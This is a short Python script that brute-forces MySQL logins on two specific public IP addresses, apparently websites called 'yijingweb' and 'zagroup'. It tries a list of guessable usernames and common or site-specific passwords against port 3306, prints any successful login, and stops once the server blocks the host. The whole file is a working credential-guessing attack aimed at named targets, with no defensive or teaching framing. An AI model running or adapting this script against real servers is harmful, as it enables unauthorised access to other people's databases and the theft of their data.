#!/usr/bin/env python3
"""MySQL user brute on both sites - site-specific users + common pws"""
import subprocess, sys

TARGETS = [
    ("211.149.232.69", "yijingweb"),
    ("211.149.242.42", "zagroup"),
]
USERS = ["root", "admin", "yijingweb", "yijing", "zagroup", "zgroup", "test",
         "mysql", "web", "db", "hxz", "webmall"]
PWS = ["", "root", "123456", "admin123", "password", "admin", "mysql", "root123",
       "yijingweb123", "zagroup123", "yijing123", "test123", "12345678", "123456789",
       "888888", "admin888", "web123", "db123", "hxz123", "a123456"]

for ip, name in TARGETS:
    print("=== %s (%s) ===" % (name, ip), flush=True)
    found = False
    for u in USERS:
        for pw in PWS:
            try:
                r = subprocess.run(["mysql", "-h", ip, "-P", "3306", "-u", u,
                                    "-p" + pw, "-e", "select 1", "--connect-timeout=4"],
                                   capture_output=True, timeout=8)
                if r.returncode == 0:
                    print("!!! MYSQL HIT %s/%s" % (u, pw), flush=True)
                    found = True
                    break
                err = r.stderr.decode("utf-8", "ignore")
                if "1129" in err:
                    print("  BLOCKED at %s/%s" % (u, pw), flush=True)
                    sys.exit(0)
            except Exception:
                pass
        if found:
            break
    if not found:
        print("  no hit", flush=True)
